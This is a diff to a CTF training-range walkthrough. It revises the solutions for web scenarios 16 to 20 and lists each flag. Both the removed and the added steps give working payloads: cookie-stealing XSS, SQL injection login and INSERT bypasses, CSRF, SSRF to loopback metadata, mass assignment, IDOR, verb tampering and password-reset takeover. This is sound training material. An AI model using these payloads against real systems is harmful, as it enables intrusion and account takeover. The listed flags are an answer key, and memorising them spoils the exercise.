@@ -26,11 +26,11 @@ This guide documents the full 21-port modular architecture for the CSZone CTF Ra
 | **8013** | Scenario 13: Stored Attribute XSS | Cross-Site Scripting | Naive Filter Bypass & Attribute Event Breakout | `CTF{st0r3d_4ttr1but3_br34k0ut}` |
 | **8014** | Scenario 14: DOM-based XSS | Cross-Site Scripting | Client-Side URL Routing to innerHTML Sink | `CTF{d0m_xss_s1nk_m4st3r}` |
 | **8015** | Scenario 15: WAF Bypass XSS | Cross-Site Scripting | HTML5 SVG Animation & Details Toggle Vectors | `CTF{w4f_byp4ss_h5_v3ct0r}` |
-| **8016** | Scenario 16: SQLi & Stored XSS | Chained Exploit | Legacy Admin SQLi Bypass & Stored Cookie Theft | `CTF{st0r3d_c00k13_th3ft}` |
-| **8017** | Scenario 17: CSRF Account | CSRF | Cross-Site Request Forgery State Change | `CTF{csrf_n0_t0k3n_pwn3d}` |
-| **8018** | Scenario 18: File Upload | Upload / Stored XSS | Blocklist Bypass & Direct Script Execution | Verified HTML/JS Execution |
-| **8019** | Scenario 19: SSRF Metadata | SSRF | Internal Loopback Cloud Metadata Retrieval | `CTF{ssrf_1nt3rn4l_m3t4d4t4}` |
-| **8020** | Scenario 20: Backend IDOR | Web / IDOR | Order Object Reference & Audit Note Leak | `CTF{b4ck3nd_1d0r_r34l}` |
+| **8016** | Scenario 16: INSERT SQLi & Stored XSS Chain | Chained Exploit | INSERT SQLi & Second-Order Stored XSS | `CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}` |
+| **8017** | Scenario 17: Mass Assignment & Profile IDOR | IDOR / BOPLA | Mass Assignment Privilege Escalation | `CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}` |
+| **8018** | Scenario 18: UUID Identifier Leakage IDOR | IDOR / UUID | Leaked Non-Sequential UUID Access | `CTF{uu1d_l34k_d0cum3nt_v4ult}` |
+| **8019** | Scenario 19: Verb Tampering Multi-Tenant IDOR | IDOR / API Auth | RESTful HTTP Verb Tampering Bypass | `CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}` |
+| **8020** | Scenario 20: BOLA Password Reset ATO | API Security / BOLA | Multi-Step Reset Parameter Tampering | `CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}` |
 | **8021** | Scenario 21: Cache Attacks | Web Cache Attacks | Web Cache Deception & Host Cache Poisoning | `CTF{c4ch3_d3c3pt10n_l34k}` |
 
 ---
@@ -158,37 +158,46 @@ This guide documents the full 21-port modular architecture for the CSZone CTF Ra
      `<svg><animate onbegin=document.getElementById('rule-flag').innerText=document.getElementById('waf-secret').value attributeName=x>`
   3. Flag: `CTF{w4f_byp4ss_h5_v3ct0r}`.
 
-### Scenario 16 (Port 8016) — Legacy Admin SQLi + Stored XSS Chain
-- **URL:** `http://<host>:8016/`
+### Scenario 16 (Port 8016) — Chained Exploit: INSERT SQLi to Second-Order Stored XSS
+- **URL:** `http://<host>:8016/tickets`
 - **Steps:**
-  1. Post XSS payload to `/guestbook`: `<img src=x onerror="fetch('/xss/collect?c='+encodeURIComponent(document.cookie))">`.
-  2. Bypass login at `/legacy-admin/login` using `admin' OR '1'='1' -- -` (sets cookie `admin_session_flag=CTF{st0r3d_c00k13_th3ft}`).
-  3. Visit `/admin/inbox` -> triggers beacon -> inspect `/xss/collect/log` to capture `CTF{st0r3d_c00k13_th3ft}`.
+  1. Test SQL injection in Department Code field: `SEC'` reveals `INSERT INTO support_tickets ... VALUES ('$submitter', '$department', '$issue_desc', 'LOW', 0)`.
+  2. Construct chained INSERT payload in Department Code field:
+     `SEC', '<img src=x onerror=alert("cszone")>', 'CRITICAL', 1) --`
+  3. Submit the ticket to inject high priority and payload into the database.
+  4. Navigate to Admin Compliance Queue: `http://<host>:8016/admin/compliance`.
+  5. The high-priority ticket renders unescaped HTML, executing the script and revealing `CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}`.
 
-### Scenario 17 (Port 8017) — CSRF Account Email
-- **URL:** `http://<host>:8017/`
+### Scenario 17 (Port 8017) — Mass Assignment & Profile Overwrite IDOR
+- **URL:** `http://<host>:8017/profile`
 - **Steps:**
-  1. Log in to account.
-  2. Fire unauthenticated cross-site POST to `/account/email` with `email=pwned@attacker-controlled.test`.
-  3. Flag: `CTF{csrf_n0_t0k3n_pwn3d}`.
+  1. Intercept `POST /api/user/profile/update` in Burp Suite.
+  2. Inject privileged attributes into JSON body: `{"user_id": 102, "full_name": "Carlos Rivera", "role": "admin", "is_vip": 1}`.
+  3. Submit request to elevate role to `admin`.
+  4. Navigate to Executive Security Console: `http://<host>:8017/admin/dashboard` to capture `CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}`.
 
-### Scenario 18 (Port 8018) — Unrestricted File Upload
-- **URL:** `http://<host>:8018/upload`
+### Scenario 18 (Port 8018) — Obfuscated & UUID Identifier Leakage IDOR
+- **URL:** `http://<host>:8018/vault`
 - **Steps:**
-  1. Upload `pwn.html` containing `<script>...</script>`.
-  2. Fetch `/static/uploads/pwn.html` to confirm execution.
+  1. Inspect Public Activity & Audit Feed at `http://<host>:8018/activity` (or `GET /api/public/audit-feed`).
+  2. Discover leaked Chief Security Officer document UUID: `8f9b2c34-91a0-4d5e-88fc-3176d1e49e22`.
+  3. Exploit IDOR endpoint: `http://<host>:8018/vault/view?doc_id=8f9b2c34-91a0-4d5e-88fc-3176d1e49e22` (or `GET /api/documents/download?doc_id=...`).
+  4. Download classified document and extract flag: `CTF{uu1d_l34k_d0cum3nt_v4ult}`.
 
-### Scenario 19 (Port 8019) — Server-Side Request Forgery (SSRF)
-- **URL:** `http://<host>:8019/avatar-import`
+### Scenario 19 (Port 8019) — RESTful HTTP Verb Tampering & Multi-Tenant IDOR
+- **URL:** `http://<host>:8019/workspaces`
 - **Steps:**
-  1. Post `url=http://127.0.0.1:8019/internal/metadata`.
-  2. Server returns JSON metadata containing `CTF{ssrf_1nt3rn4l_m3t4d4t4}`.
+  1. Send `GET /api/workspaces/tenant-99-enterprise/settings` -> observe `403 Forbidden`.
+  2. Perform HTTP Verb Tampering in Burp Suite: change method from `GET` to `PUT` with JSON body `{"region": "us-west-2", "compliance_mode": "disabled"}`.
+  3. The backend bypasses the access check on `PUT` and returns the tenant's `master_secret_key`: `CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}`.
 
-### Scenario 20 (Port 8020) — Backend IDOR Orders
-- **URL:** `http://<host>:8020/orders`
+### Scenario 20 (Port 8020) — BOLA Multi-Step Password Reset Account Takeover
+- **URL:** `http://<host>:8020/login`
 - **Steps:**
-  1. Access `/orders/2` directly without authorization.
-  2. Order notes contain `CTF{b4ck3nd_1d0r_r34l}`.
+  1. Request reset session for Carlos: `POST /api/auth/forgot-password` with `{"email": "carlos@apexpay.io"}`.
+  2. Exploit BOLA in OTP verification: `POST /api/auth/verify-reset-step` with `{"session_token": "<token>", "otp": "654321", "account_id": 100}` -> leaks Admin reset token!
+  3. Apply new password for admin: `POST /api/auth/confirm-new-password` with `{"reset_token": "<admin_token>", "new_password": "NewAdminPass123!"}`.
+  4. Log in at `http://<host>:8020/login` with `admin@apexpay.io` and new password -> capture `CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}`.
 
 ### Scenario 21 (Port 8021) — Web Cache Attacks
 - **URL:** `http://<host>:8021/`
